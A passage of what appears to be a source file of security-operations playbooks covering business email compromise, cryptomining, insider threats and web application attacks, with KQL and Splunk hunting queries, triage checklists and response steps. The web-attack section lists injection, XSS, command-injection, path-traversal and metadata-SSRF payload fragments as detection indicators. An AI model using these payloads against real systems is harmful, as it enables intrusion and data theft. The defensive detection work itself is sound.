| Exchange Online / M365 | OfficeActivity, MailItemsAccessed | Operation, UserId, ClientIP, MailboxOwnerUPN |
| Email Gateway | Message trace | sender, recipient, subject, message_id |
| Azure AD | AuditLogs | OperationName (MFA, inbox rules, app consent) |
| Unified Audit Log | UAL | Operation, Workload, ClientIP, UserId |
| Financial Systems | ERP / AP logs | payment_change, vendor_update, wire_transfer |

### MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|-----------|----|--------|
| Phishing: Spearphishing Link | T1566.002 | Initial Access |
| Valid Accounts: Cloud Accounts | T1078.004 | Defense Evasion, Initial Access |
| Email Collection: Remote Email Collection | T1114.002 | Collection |
| Email Forwarding Rule | T1114.003 | Collection, Exfiltration |
| Impersonation | T1656 | Defense Evasion |

## Initial Triage Checklist

- [ ] Identify the compromised or impersonated email account
- [ ] Determine the BEC type: account takeover, impersonation, or vendor compromise
- [ ] Check for unauthorized inbox rules (forwarding, auto-delete, move rules)
- [ ] Review recent email activity: sent items, deleted items, search history
- [ ] Check sign-in logs for anomalous locations, IPs, or devices
- [ ] Identify the financial or data impact (payment redirections, sensitive data access)
- [ ] Determine the timeline: when did compromise begin?
- [ ] Check for MFA manipulation or app consent grants

## BEC Attack Patterns

| Pattern | Description | Key Indicators |
|---------|-------------|----------------|
| CEO Fraud | Attacker impersonates executive, requests urgent wire transfer | Lookalike domain, urgency language, new payment details |
| Invoice Fraud | Attacker redirects legitimate vendor payments to attacker account | Modified invoice, new bank details, timing near payment cycle |
| Account Takeover | Attacker gains access to real account, operates from it | Inbox rules, anomalous sign-ins, internal phishing |
| Vendor Compromise | Attacker compromises vendor email, targets their customers | Legitimate sender, modified payment instructions |
| Data Theft | Attacker uses BEC access to steal W2s, PII, or business data | Email searches for "wire", "payment", "SSN", "tax" |

## Pivot Queries

### KQL (Microsoft Sentinel)

```kql
// Inbox rule creation and modification
OfficeActivity
| where TimeGenerated > ago(30d)
| where UserId == "<COMPROMISED_USER>"
| where Operation in ("New-InboxRule", "Set-InboxRule", "UpdateInboxRules",
    "Set-Mailbox", "New-TransportRule")
| project TimeGenerated, Operation, Parameters, ClientIP

// Email forwarding configuration
OfficeActivity
| where TimeGenerated > ago(30d)
| where Operation in ("Set-Mailbox", "Set-OwaMailboxPolicy")
| where Parameters has "ForwardingSmtpAddress" or Parameters has "ForwardTo"
    or Parameters has "RedirectTo"
| project TimeGenerated, UserId, Operation, Parameters, ClientIP

// Sent email analysis for the compromised account
OfficeActivity
| where TimeGenerated > ago(30d)
| where UserId == "<COMPROMISED_USER>"
| where Operation == "Send"
| project TimeGenerated, UserId, DestFolder, ClientIP, Item

// Mailbox search activity (data discovery)
OfficeActivity
| where TimeGenerated > ago(30d)
| where UserId == "<COMPROMISED_USER>"
| where Operation in ("SearchCreated", "SearchStarted", "ViewedSearch")
| project TimeGenerated, UserId, Operation, Parameters, ClientIP

// Anomalous sign-in patterns for the user
SigninLogs
| where TimeGenerated > ago(30d)
| where UserPrincipalName == "<COMPROMISED_USER>"
| where ResultType == "0"
| extend City = tostring(LocationDetails.city),
    Country = tostring(LocationDetails.countryOrRegion)
| summarize LoginCount = count(), IPs = make_set(IPAddress, 20)
    by City, Country, AppDisplayName
| sort by LoginCount desc

// OAuth / app consent grants
AuditLogs
| where TimeGenerated > ago(30d)
| where OperationName == "Consent to application"
| where TargetResources has "<COMPROMISED_USER>"
| project TimeGenerated, OperationName, InitiatedBy, TargetResources, AdditionalDetails
```

### SPL (Splunk)

```spl
// Inbox rule changes
index=o365 sourcetype="o365:management:activity" UserId="<COMPROMISED_USER>"
    (Operation="New-InboxRule" OR Operation="Set-InboxRule"
     OR Operation="UpdateInboxRules")
| table _time Operation Parameters ClientIP

// Email forwarding setup
index=o365 (Operation="Set-Mailbox" OR Operation="Set-OwaMailboxPolicy")
| search Parameters="*Forward*" OR Parameters="*Redirect*"
| table _time UserId Operation Parameters ClientIP

// Sent items from compromised account
index=o365 UserId="<COMPROMISED_USER>" Operation="Send"
| table _time UserId DestFolder ClientIP Subject

// Login anomalies
index=azure_ad sourcetype="azure:aad:signin"
    userPrincipalName="<COMPROMISED_USER>" result_type=0
| iplocation src_ip
| stats count values(app_name) as apps by src_ip City Country
| sort -count

// Mailbox access from unusual IPs
index=o365 sourcetype="o365:management:activity"
    UserId="<COMPROMISED_USER>" Operation="MailItemsAccessed"
| stats count by ClientIP _time
| sort -_time
```

## Enrichment Steps

1. **Account Compromise Timeline**
   - Establish when the account was first accessed from an unauthorized source
   - Map all sign-in activity from unauthorized IPs over the compromise window
   - Identify the initial compromise method (phishing, password spray, token theft)
   - Check for AiTM (adversary-in-the-middle) proxy indicators

2. **Inbox Rule Audit**
   - List ALL inbox rules on the compromised account
   - Look for rules that forward, redirect, or delete emails
   - Check for rules that move specific emails (from finance, IT, legal) to hidden folders
   - Look for rules targeting keywords: invoice, payment, wire, bank, transfer

3. **Email Activity Analysis**
   - Review all emails sent from the compromised account during the compromise window
   - Check for replies to financial emails with modified payment details
   - Look for internal phishing emails sent to other employees
   - Review deleted items and purged items for evidence of attacker cleanup
   - Check email search history for reconnaissance (searching "wire", "payment", "CEO")

4. **Financial Impact Assessment**
   - Work with finance/AP team to identify any payment redirections
   - Check if vendor banking details were changed during the compromise window
   - Review wire transfer requests made during the period
   - Determine if W2, tax, or PII data was requested or sent

5. **Scope: Other Compromised Accounts**
   - Check if the compromised account sent phishing emails to internal users
   - Review sign-in logs for internal recipients who may have also been compromised
   - Look for the same attacker IPs accessing other accounts
   - Check for OAuth app consent grants across the tenant

## Escalation Criteria

| Condition | Severity | Action |
|-----------|----------|--------|
| Lookalike domain impersonation, no account compromise | Medium | Block domain, alert finance team |
| Account compromised, inbox rules created, no financial impact yet | High | Escalate, contain account, remove rules |
| Payment redirection email sent to finance | Critical | Escalate to IR + Legal + Finance, halt payment |
| Wire transfer already executed to attacker account | Critical | Escalate to IR + Legal + Finance + Law Enforcement, initiate bank recall |
| Internal phishing from compromised account | Critical | Escalate to IR, scope internal compromise |
| Sensitive data (W2, PII, IP) exfiltrated via email | Critical | Escalate to IR + Legal + Compliance |

## Documentation Template

```markdown
### Business Email Compromise Investigation

**Incident ID:** [INC-ID]
**Date/Time Detected:** [YYYY-MM-DD HH:MM UTC]
**Analyst:** [NAME]

**Compromised Account:** [USER_UPN]
**Department:** [DEPARTMENT]
**Role:** [TITLE]

**BEC Type:** [ ] Account Takeover [ ] Impersonation [ ] Vendor Compromise

**Compromise Timeline:**
| Time (UTC) | Event |
|------------|-------|
| [TIME] | Initial compromise (estimated) |
| [TIME] | First unauthorized sign-in |
| [TIME] | Inbox rules created |
| [TIME] | Fraudulent email(s) sent |
| [TIME] | Detection / report |
| [TIME] | Containment |

**Initial Access Method:** [Phishing / Password Spray / Token Theft / AiTM / Unknown]
**Attacker IP(s):** [LIST]
**Attacker Location(s):** [LIST]

**Inbox Rules Found:**
| Rule Name | Condition | Action |
|-----------|-----------|--------|
| [NAME] | [FROM/SUBJECT/etc.] | [FORWARD/DELETE/MOVE] |

**Financial Impact:**
- Payment redirection attempted: [YES/NO]
- Amount: [$AMOUNT]
- Payment executed: [YES/NO]
- Bank recall initiated: [YES/NO]
- Recovery status: [PENDING/RECOVERED/LOST]

**Data Impact:**
- Emails accessed: [COUNT / DESCRIPTION]
- Data exfiltrated: [DESCRIPTION]
- Internal users phished: [COUNT — NAMES]

**Actions Taken:**
- [ ] Revoked all active sessions
- [ ] Reset password and MFA
- [ ] Removed malicious inbox rules
- [ ] Removed email forwarding
- [ ] Revoked OAuth app consents
- [ ] Notified finance team to halt payments
- [ ] Initiated bank recall for executed transfers
- [ ] Purged internal phishing emails
- [ ] Checked other accounts for compromise
- [ ] Notified law enforcement (if financial loss)

**Verdict:** [True Positive]
**Escalated:** [YES — to whom]
**Ticket:** [INC-ID]
```

## Response Actions Quick Reference

1. **Contain NOW**: Revoke all sessions, reset password, reset MFA
2. **Remove**: Delete all malicious inbox rules and forwarding configurations
3. **Financial**: Contact finance immediately to halt pending wire transfers; initiate bank recall for executed transfers
4. **Scope**: Check for internal phishing and additional compromised accounts
5. **Legal**: Engage legal counsel for regulatory notification and law enforcement referral
6. **Recover**: Audit and clean the compromised mailbox, restore deleted legitimate emails
""",
        ),
        # ---------------------------------------------------------------
        # Article 13: Cryptomining Activity
        # ---------------------------------------------------------------
        (
            "Investigating Cryptomining Activity",
            ["alert-investigation", "cryptomining", "resource-hijacking", "cryptocurrency", "unauthorized-software"],
            r"""# Investigating Cryptomining Activity

## Alert Context

Cryptomining alerts fire when unauthorized cryptocurrency mining software is detected on endpoints, servers, or cloud infrastructure. Attackers deploy cryptominers after gaining access to monetize compromised systems. Cryptomining may also appear as browser-based mining (cryptojacking) via malicious websites. While the direct data impact may be low, cryptomining indicates unauthorized access that could be leveraged for more damaging attacks.

### Key Data Sources

| Source | Log / Index | Relevant Fields |
|--------|-------------|-----------------|
| EDR / AV | Detection alerts | detection_name (XMRig, CoinMiner), process, hash |
| Sysmon | Event IDs 1, 3 | Process creation (high CPU), network connections to mining pools |
| Network Flow / Firewall | Connection logs | dst_ip, dst_port (3333, 4444, 5555, 8333, 14433, 14444), protocol (Stratum) |
| DNS | Query logs | Mining pool domain resolution (pool.minexmr.com, etc.) |
| Cloud Monitoring | Resource metrics | CPU utilization spikes, unexpected compute instances |
| Performance Monitoring | CPU/GPU metrics | Sustained high utilization from specific processes |

### MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|-----------|----|--------|
| Resource Hijacking | T1496 | Impact |
| Ingress Tool Transfer | T1105 | Command and Control |
| Scheduled Task/Job | T1053 | Execution, Persistence |
| Command and Scripting Interpreter | T1059 | Execution |

## Initial Triage Checklist

- [ ] Identify the mining process name and file path
- [ ] Determine the cryptocurrency being mined (Monero/XMR is most common)
- [ ] Check CPU/GPU utilization on the affected host
- [ ] Identify the mining pool the miner connects to (IP and domain)
- [ ] Determine how the miner was installed (initial access vector)
- [ ] Check if the miner has persistence mechanisms
- [ ] Assess whether this is endpoint mining or browser-based cryptojacking
- [ ] Determine if cloud resources were spun up for mining

## Known Mining Indicators

| Indicator | Details |
|-----------|---------|
| Common process names | xmrig, xmr-stak, minerd, cgminer, bfgminer, ethminer, t-rex, phoenixminer |
| Common pool ports | 3333, 4444, 5555, 8333, 9999, 14433, 14444, 45700 |
| Stratum protocol | `stratum+tcp://` or `stratum+ssl://` in command line or config |
| Pool domains | pool.minexmr.com, xmrpool.eu, monerohash.com, nanopool.org, 2miners.com, f2pool.com |
| Wallet addresses | Long alphanumeric strings (Monero: 4 or 8 prefix, 95 chars; Bitcoin: bc1/1/3 prefix) |
| Config files | config.json, pools.txt with pool/wallet configuration |

## Pivot Queries

### KQL (Microsoft Sentinel / Defender for Endpoint)

```kql
// Known miner process names
DeviceProcessEvents
| where TimeGenerated > ago(7d)
| where FileName has_any ("xmrig", "xmr-stak", "minerd", "cgminer",
    "bfgminer", "ethminer", "t-rex", "phoenixminer", "nbminer", "lolminer")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine,
    InitiatingProcessFileName, AccountName, FolderPath

// Network connections to known mining pool ports
DeviceNetworkEvents
| where TimeGenerated > ago(7d)
| where RemotePort in (3333, 4444, 5555, 9999, 14433, 14444, 45700)
| project TimeGenerated, DeviceName, InitiatingProcessFileName,
    RemoteIP, RemotePort, RemoteUrl

// Stratum protocol in command lines
DeviceProcessEvents
| where TimeGenerated > ago(7d)
| where ProcessCommandLine has "stratum" or ProcessCommandLine has "mining"
    or ProcessCommandLine has "pool" or ProcessCommandLine has "wallet"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, AccountName

// DNS queries to mining pool domains
DnsEvents
| where TimeGenerated > ago(7d)
| where Name has_any ("minexmr", "xmrpool", "monerohash", "nanopool",
    "2miners", "f2pool", "nicehash", "minergate", "moneroocean")
| project TimeGenerated, ClientIP, Name, QueryType

// High CPU processes (sustained computation)
DeviceProcessEvents
| where TimeGenerated > ago(24h)
| where ProcessCommandLine has_any ("-t", "--threads", "--cpu-priority",
    "--donate-level", "--algo", "randomx", "cryptonight")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, AccountName
```

### SPL (Splunk)

```spl
// Known miner processes
index=sysmon EventCode=1
| where match(Image, "(?i)(xmrig|xmr-stak|minerd|cgminer|bfgminer|ethminer|t-rex|phoenixminer)")
| table _time Computer User Image CommandLine ParentImage

// Connections to mining pool ports
index=firewall dest_port IN (3333, 4444, 5555, 9999, 14433, 14444, 45700)
| stats count values(dest_ip) as pool_ips by src_ip dest_port
| sort -count

// DNS queries to mining pools
index=dns
| where match(query, "(?i)(minexmr|xmrpool|monerohash|nanopool|2miners|f2pool|nicehash)")
| stats count by src_ip query
| sort -count

// Stratum protocol in process arguments
index=sysmon EventCode=1 (CommandLine="*stratum*" OR CommandLine="*mining*pool*"
    OR CommandLine="*--algo*" OR CommandLine="*randomx*" OR CommandLine="*cryptonight*")
| table _time Computer User Image CommandLine

// Cloud: unexpected compute instance launches
index=aws sourcetype="aws:cloudtrail" eventName="RunInstances"
| where match(requestParameters, "(?i)(p3|p4|g4|g5|c5|c6)")
| table _time userIdentity.arn requestParameters.instanceType sourceIPAddress
```

## Enrichment Steps

1. **Miner Identification**
   - Identify the exact miner software and version
   - Extract the wallet address from the command line or config file
   - Determine the mining pool URL and port
   - Check the wallet on blockchain explorers for mining payoff history
   - Submit the binary hash to VirusTotal

2. **Installation Method**
   - Trace the process tree to identify how the miner was deployed
   - Check for: web shell, SSH brute force, exploited vulnerability, phishing
   - Review download history (proxy logs, browser history, curl/wget commands)
   - Check for automated deployment via scripts, cron jobs, or scheduled tasks

3. **Persistence Mechanisms**
   - Check for scheduled tasks or cron jobs running the miner
   - Review Windows services for miner persistence
   - Check registry Run keys and startup folders
   - Look for process injection or DLL loading techniques
   - Check for rootkit that hides the mining process

4. **Resource Impact**
   - Measure CPU utilization during mining activity
   - Calculate electricity and compute cost (especially for cloud)
   - Determine how long the miner has been active
   - Assess impact on legitimate workloads (performance degradation)

5. **Scope Assessment**
   - Search for the same miner hash or pool connections across all endpoints
   - Check for the same wallet address in other incidents
   - Review if the attacker has accessed other systems from the miner host
   - For cloud: check for unauthorized instances in all regions

## Escalation Criteria

| Condition | Severity | Action |
|-----------|----------|--------|
| Browser-based cryptojacking, no persistence | Low | Block site, clear browser cache, close |
| Single endpoint miner, basic persistence | Medium | Remove miner, investigate access vector |
| Miner deployed via exploited vulnerability | High | Escalate, patch vulnerability, scope exposure |
| Miner on server or infrastructure host | High | Escalate, investigate for deeper compromise |
| Cloud compute abuse (unauthorized instances) | High | Escalate, terminate instances, rotate credentials |
| Miner deployment across multiple hosts (worm-like) | Critical | Escalate to IR, likely broader compromise |
| Miner co-exists with backdoor or RAT | Critical | Escalate to IR, full incident response |

## Documentation Template

```markdown
### Cryptomining Investigation

**Alert ID:** [ALERT-ID]
**Date/Time:** [YYYY-MM-DD HH:MM UTC]
**Analyst:** [NAME]

**Mining Details:**
- Miner software: [XMRIG / XMRSTAK / OTHER]
- Version: [VERSION]
- Cryptocurrency: [MONERO / BITCOIN / OTHER]
- Mining pool: [POOL_URL:PORT]
- Wallet address: [WALLET]
- Algorithm: [RANDOMX / CRYPTONIGHT / ETHASH / OTHER]

**Affected Host:**
- Hostname: [HOSTNAME]
- IP: [IP]
- OS: [OS]
- Role: [Workstation / Server / Cloud Instance]
- CPU utilization during mining: [PERCENTAGE]

**Binary Details:**
- File path: [PATH]
- SHA256: [HASH]
- File size: [SIZE]
- VirusTotal detections: [COUNT/TOTAL]

**Installation Method:** [Exploit / Brute Force / Phishing / Web Shell / Unknown]
**Active Since:** [DATE/TIME estimated]
**Persistence:** [Scheduled Task / Service / Cron / Registry / None]

**Scope:**
- Other hosts with same miner: [COUNT]
- Cloud instances spun up: [COUNT — TYPE — REGION]
- Estimated compute cost: [$AMOUNT]

**Actions Taken:**
- [ ] Killed mining process
- [ ] Removed binary and persistence mechanisms
- [ ] Blocked mining pool IPs/domains at firewall
- [ ] Investigated and remediated initial access vector
- [ ] Scanned all endpoints for the same miner
- [ ] Terminated unauthorized cloud instances
- [ ] Rotated compromised credentials

**Verdict:** [True Positive / Benign Positive / False Positive]
**Escalated:** [YES/NO]
**Ticket:** [INCIDENT-ID]
```

## Response Actions Quick Reference

1. **Immediate**: Kill the mining process and remove the binary
2. **Block**: Add mining pool IPs and domains to firewall and DNS blocklists
3. **Remove**: Delete persistence mechanisms (scheduled tasks, services, cron jobs)
4. **Investigate**: Determine and remediate the initial access vector
5. **Scope**: Search for the same miner across all endpoints and cloud accounts
6. **Harden**: Patch the exploited vulnerability, restrict outbound connections to mining ports
""",
        ),
        # ---------------------------------------------------------------
        # Article 14: Insider Threat Indicators
        # ---------------------------------------------------------------
        (
            "Investigating Insider Threat Indicators",
            ["alert-investigation", "insider-threat", "data-theft", "user-behavior", "exfiltration"],
            r"""# Investigating Insider Threat Indicators

## Alert Context

Insider threat alerts fire when user behavior analytics (UBA/UEBA) or rule-based detections identify anomalous patterns that suggest an employee, contractor, or trusted partner is misusing access for unauthorized purposes. Insider threats range from negligent data handling to deliberate espionage or sabotage. These investigations require extreme sensitivity due to privacy concerns and potential HR/legal implications.

### Key Data Sources

| Source | Log / Index | Relevant Fields |
|--------|-------------|-----------------|
| UEBA / UBA Platform | Behavior anomaly scores | user, anomaly_type, risk_score, baseline_deviation |
| DLP | Data movement alerts | user, channel, data_type, volume, destination |
| Cloud Access (CASB) | File access, download, sharing | user, app, file, action, volume |
| Badge / Physical Access | Entry logs | user, location, time, door |
| HR System | Employee records | department, hire_date, termination_date, PIP_status |
| Endpoint DLP / UAM | Screen capture, file copy, printing | user, activity, timestamp, content |
| Email | Sent items, forwarding | sender, recipient, attachment, volume |
| VPN / Remote Access | Connection logs | user, connect_time, duration, data_transferred |

### MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|-----------|----|--------|
| Data from Local System | T1005 | Collection |
| Data Staged: Local Data Staging | T1074.001 | Collection |
| Archive Collected Data | T1560 | Collection |
| Exfiltration Over Web Service | T1567 | Exfiltration |
| Exfiltration Over Alternative Protocol | T1048 | Exfiltration |
| Data from Information Repositories | T1213 | Collection |

## Initial Triage Checklist

- [ ] Review the specific behavior anomaly that triggered the alert
- [ ] Identify the user and their role, department, and access level
- [ ] Check with HR: Is the user on PIP, notice period, or facing disciplinary action?
- [ ] Establish the user's normal behavioral baseline (access patterns, data volumes)
- [ ] Quantify the deviation from baseline (how abnormal is this activity?)
- [ ] Determine the sensitivity of the data involved
- [ ] Check for temporal patterns: after hours, weekends, holidays
- [ ] Assess whether there is a legitimate business justification

## Common Insider Threat Indicators

| Category | Indicators |
|----------|------------|
| Pre-Departure | Resume on work device, job search sites, increased personal email usage |
| Data Hoarding | Mass file downloads, accessing repositories outside normal scope |
| Data Exfiltration | USB transfers, personal cloud uploads, large email attachments to self |
| Access Anomalies | Accessing systems not required for role, privilege escalation requests |
| Temporal Anomalies | Activity during off-hours, weekends, vacation periods |
| Behavioral Changes | Bypassing security controls, disabling DLP agents, using Tor/VPN |
| Communication Red Flags | Contact with competitors, encrypted messaging for work discussions |
| Technical Indicators | Unauthorized tools, screen capture software, personal cloud sync clients |

## Pivot Queries

### KQL (Microsoft Sentinel)

```kql
// User file download volume over time (baseline comparison)
CloudAppEvents
| where TimeGenerated > ago(30d)
| where AccountDisplayName == "<USERNAME>"
| where ActionType in ("FileDownloaded", "FileAccessed")
| summarize DailyDownloads = count() by bin(TimeGenerated, 1d)
| render timechart

// Abnormal data volume by user (compared to peers)
CloudAppEvents
| where TimeGenerated > ago(7d)
| where ActionType == "FileDownloaded"
| summarize Downloads = count(), UniqueFiles = dcount(ObjectName) by AccountDisplayName
| sort by Downloads desc
| take 20

// USB file copy events (if DLP/endpoint telemetry available)
DeviceFileEvents
| where TimeGenerated > ago(30d)
| where ActionType == "FileCreated"
| where FolderPath startswith "E:\\" or FolderPath startswith "F:\\"
    or FolderPath startswith "G:\\"
| where InitiatingProcessAccountName == "<USERNAME>"
| project TimeGenerated, DeviceName, FileName, FolderPath, FileSize

// After-hours access patterns
SigninLogs
| where TimeGenerated > ago(30d)
| where UserPrincipalName == "<USERNAME>"
| extend HourOfDay = hourofday(TimeGenerated), DayOfWeek = dayofweek(TimeGenerated)
| where HourOfDay < 6 or HourOfDay > 22 or DayOfWeek == 0d or DayOfWeek == 6d
| project TimeGenerated, IPAddress, AppDisplayName, HourOfDay, DayOfWeek

// Email volume to external recipients
OfficeActivity
| where TimeGenerated > ago(30d)
| where UserId == "<USERNAME>"
| where Operation == "Send"
| where DestFolder == "Sent Items"
| summarize DailySent = count() by bin(TimeGenerated, 1d)
| render timechart
```

### SPL (Splunk)

```spl
// File download volume comparison across users
index=casb action="download"
| stats count as downloads dc(file_name) as unique_files sum(file_size) as total_bytes by user
| eval total_mb=round(total_bytes/1048576, 2)
| sort -downloads
| head 20

// User activity timeline (multi-source correlation)
index=* user="<USERNAME>"
| stats count by sourcetype, _time
| timechart span=1d count by sourcetype

// USB device connections
index=sysmon EventCode=6 Computer="<USER_WORKSTATION>"
| table _time DeviceDescription

// Large email attachments to personal domains
index=email sender="<USERNAME>*"
| where match(recipient, "(?i)(gmail|yahoo|hotmail|outlook|protonmail)")
| where attachment_size > 1048576
| table _time sender recipient subject attachment_name attachment_size
| sort -attachment_size

// After-hours VPN connections
index=vpn user="<USERNAME>"
| eval hour=strftime(_time, "%H")
| where hour < 6 OR hour > 22
| table _time user src_ip duration bytes_transferred
```

## Enrichment Steps

1. **HR and Management Context (CRITICAL)**
   - Coordinate with HR BEFORE contacting the user or their manager
   - Determine employment status: active, notice period, PIP, contractor end date
   - Understand the user's role and what data access is legitimately required
   - Check for any ongoing HR investigations or complaints
   - Insider threat investigations have legal and privacy implications; follow your org's policy

2. **Behavioral Baseline**
   - Establish the user's normal patterns over the past 90 days
   - Compare current activity against both their own baseline and peer group
   - Look for gradual escalation (slowly increasing data access over weeks)
   - Identify the specific date when behavior changed

3. **Data Sensitivity Assessment**
   - Classify the data being accessed or transferred
   - Determine if the data falls under regulatory protection (PII, PHI, trade secrets)
   - Assess the potential business impact of the data leaving the organization
   - Quantify the volume: how many files, records, or gigabytes

4. **Transfer Destination Analysis**
   - Identify where the data is going: personal email, cloud storage, USB, print
   - Check if the destination is a competitor, personal account, or unknown entity
   - For cloud uploads, determine the account ownership (personal vs. corporate)
   - Review all communication channels for data transfer (email, chat, cloud, physical)

5. **Corroborating Evidence**
   - Look for multiple indicators converging (access anomaly + after hours + USB transfer)
   - Check badge access logs for unusual physical access patterns
   - Review printing activity for sensitive document printing
   - Assess whether the user has attempted to cover tracks (log deletion, DLP agent disabling)

## Escalation Criteria

| Condition | Severity | Action |
|-----------|----------|--------|
| Minor policy violation, appears accidental | Low | Document, coordinate with HR for coaching |
| Repeated DLP triggers with no malicious intent evident | Medium | Escalate to manager and HR for training |
| Departing employee accessing data outside their scope | High | Escalate to insider threat team, increase monitoring |
| Active data staging and exfiltration to personal accounts | Critical | Escalate to IR + Legal + HR, preserve evidence |
| Evidence of working with competitor or foreign entity | Critical | Escalate to Legal + Executive + possibly law enforcement |
| Sabotage indicators (deleting data, planting backdoors) | Critical | Escalate to IR + Legal, contain immediately |

## Documentation Template

```markdown
### Insider Threat Investigation

**Case ID:** [CASE-ID]
**Date/Time:** [YYYY-MM-DD HH:MM UTC]
**Analyst:** [NAME]

**CONFIDENTIALITY: This investigation is RESTRICTED. Do not share outside the insider threat team, HR, and Legal.**

**Subject:**
- Name: [NAME]
- Username: [USERNAME]
- Department: [DEPARTMENT]
- Role: [TITLE]
- Manager: [MANAGER_NAME]
- Employment status: [Active / Notice Period / PIP / Contractor]
- Hire date: [DATE]
- Expected departure date: [DATE if applicable]

**Alert Summary:**
[Description of the behavioral anomaly or rule trigger]

**Behavioral Analysis:**
- Normal baseline: [DESCRIPTION OF TYPICAL ACTIVITY]
- Current deviation: [DESCRIPTION OF ANOMALOUS ACTIVITY]
- Deviation start date: [DATE]
- Risk score: [SCORE if from UEBA]

**Data Involved:**
- Data classification: [PUBLIC / INTERNAL / CONFIDENTIAL / RESTRICTED]
- Data types: [SOURCE CODE / CUSTOMER DATA / FINANCIAL / IP / PII]
- Volume: [FILES / RECORDS / SIZE]
- Sensitivity assessment: [LOW / MEDIUM / HIGH / CRITICAL]

**Exfiltration Channels:**
| Channel | Activity | Volume | Destination |
|---------|----------|--------|-------------|
| Email | [YES/NO] | [SIZE] | [DEST] |
| Cloud Upload | [YES/NO] | [SIZE] | [SERVICE] |
| USB | [YES/NO] | [SIZE] | [DEVICE] |
| Print | [YES/NO] | [PAGES] | [PRINTER] |

**Actions Taken:**
- [ ] Coordinated with HR and Legal before proceeding
- [ ] Established behavioral baseline
- [ ] Assessed data sensitivity and volume
- [ ] Identified exfiltration channels
- [ ] Preserved evidence (logs, screenshots, forensic image)
- [ ] Increased monitoring on subject
- [ ] Restricted access (if authorized by HR/Legal)

**IMPORTANT: Do NOT contact the subject directly without HR/Legal approval.**

**Verdict:** [Confirmed Insider Threat / Negligent Behavior / False Positive]
**Escalated:** [YES — to whom]
**Case Status:** [Open / Monitoring / Closed]
**Ticket:** [CASE-ID]
```

## Response Actions Quick Reference

1. **Coordinate First**: ALWAYS involve HR and Legal before taking action against the user
2. **Preserve Evidence**: Forensic imaging, log preservation, and chain of custody documentation
3. **Monitor**: If investigation is ongoing, increase monitoring without alerting the subject
4. **Restrict**: If authorized, reduce access scope or revoke specific permissions
5. **Contain**: If confirmed and imminent, work with HR/Legal to terminate access and initiate exit procedures
6. **Remediate**: Rotate credentials for systems the subject accessed, audit shared accounts
""",
        ),
        # ---------------------------------------------------------------
        # Article 15: Web Application Attack (SQLi/XSS/RCE)
        # ---------------------------------------------------------------
        (
            "Investigating a Web Application Attack (SQLi/XSS/RCE)",
            ["alert-investigation", "web-attack", "sqli", "xss", "rce", "application-security"],
            r"""# Investigating a Web Application Attack (SQLi/XSS/RCE)

## Alert Context

Web application attack alerts fire when a WAF, IDS, or application security tool detects exploitation attempts against web applications. SQL injection (SQLi), Cross-Site Scripting (XSS), and Remote Code Execution (RCE) are the most critical categories. The investigation must determine: Was the attack successful? Was data exfiltrated or modified? Is the vulnerability patched?

### Key Data Sources

| Source | Log / Index | Relevant Fields |
|--------|-------------|-----------------|
| WAF (Cloudflare, AWS WAF, ModSecurity, F5) | WAF logs | rule_id, action, src_ip, uri, payload, response_code |
| IDS/IPS (Snort, Suricata) | Alert logs | signature, src_ip, dst_ip, payload, classification |
| Web Server (Apache, Nginx, IIS) | Access and error logs | client_ip, method, uri, query_string, status_code, user_agent |
| Application Logs | App-specific | request_params, user, error_trace, database_queries |
| Database Logs | Query logs, audit logs | query_text, user, affected_rows, error_messages |
| EDR / OS | Process and file events | web server child processes, file writes |
| Network Capture | PCAP / flow | full request/response for deep analysis |

### MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|-----------|----|--------|
| Exploit Public-Facing Application | T1190 | Initial Access |
| Server Software Component: Web Shell | T1505.003 | Persistence |
| Command and Scripting Interpreter | T1059 | Execution |
| Data from Information Repositories | T1213 | Collection |

## Initial Triage Checklist

- [ ] Identify the attack type: SQLi, XSS (reflected/stored/DOM), RCE, LFI/RFI, SSRF, path traversal
- [ ] Review the WAF/IDS rule that triggered and the specific payload
- [ ] Determine the action: was the attack blocked or allowed through?
- [ ] Identify the source IP and check for distributed attacks
- [ ] Determine the targeted application, endpoint, and parameter
- [ ] Check the HTTP response code and body for signs of success
- [ ] Review the application logs for errors or unexpected behavior
- [ ] For SQLi: check database logs for unauthorized queries
- [ ] For RCE: check for new processes or files on the web server

## Attack Payload Indicators

| Attack Type | Payload Patterns |
|-------------|-----------------|
| SQL Injection | `' OR 1=1--`, `UNION SELECT`, `; DROP TABLE`, `SLEEP(`, `BENCHMARK(`, `LOAD_FILE(`, `INTO OUTFILE` |
| XSS | `<script>`, `javascript:`, `onerror=`, `onload=`, `<img src=x`, `<svg onload`, `document.cookie` |
| RCE | `; id`, `| cat /etc/passwd`, `$({curl`, `eval(`, `exec(`, `system(`, `Runtime.getRuntime()` |
| LFI / Path Traversal | `../../../`, `/etc/passwd`, `C:\Windows\system.ini`, `php://filter`, `file://` |
| SSRF | `http://169.254.169.254`, `http://127.0.0.1`, `http://[::1]`, `gopher://`, metadata endpoints |
| Command Injection | `; whoami`, backtick injection, `$(command)`, `%0a`, pipe characters |

## Pivot Queries

### KQL (Microsoft Sentinel)

```kql
// WAF alerts for a specific source IP
AzureDiagnostics
| where TimeGenerated > ago(24h)
| where Category == "ApplicationGatewayFirewallLog"
| where clientIp_s == "<ATTACKER_IP>"
| project TimeGenerated, clientIp_s, requestUri_s, ruleSetType_s,
    ruleId_s, action_s, Message
| sort by TimeGenerated asc

// SQL injection patterns in web logs
W3CIISLog
| where TimeGenerated > ago(24h)
| where csUriQuery has_any ("UNION", "SELECT", "OR+1=1", "DROP", "SLEEP",
    "BENCHMARK", "LOAD_FILE", "INTO+OUTFILE", "--", "%27")
| project TimeGenerated, cIP, csMethod, csUriStem, csUriQuery, scStatus

// Web server spawning child processes (RCE indicator)
SysmonEvent
| where TimeGenerated > ago(24h)
| where EventID == 1
| where ParentImage has_any ("w3wp.exe", "httpd.exe", "nginx.exe",
    "apache2", "java.exe", "node.exe", "python")
| where Image !has_any ("w3wp.exe", "conhost.exe")
| project TimeGenerated, Computer, ParentImage, Image, CommandLine, User

// File creation by web server process (web shell indicator)
SysmonEvent
| where TimeGenerated > ago(24h)
| where EventID == 11
| where Image has_any ("w3wp.exe", "httpd.exe", "nginx", "apache2", "java.exe")
| where TargetFilename has_any (".asp", ".aspx", ".php", ".jsp", ".jspx", ".py", ".sh")
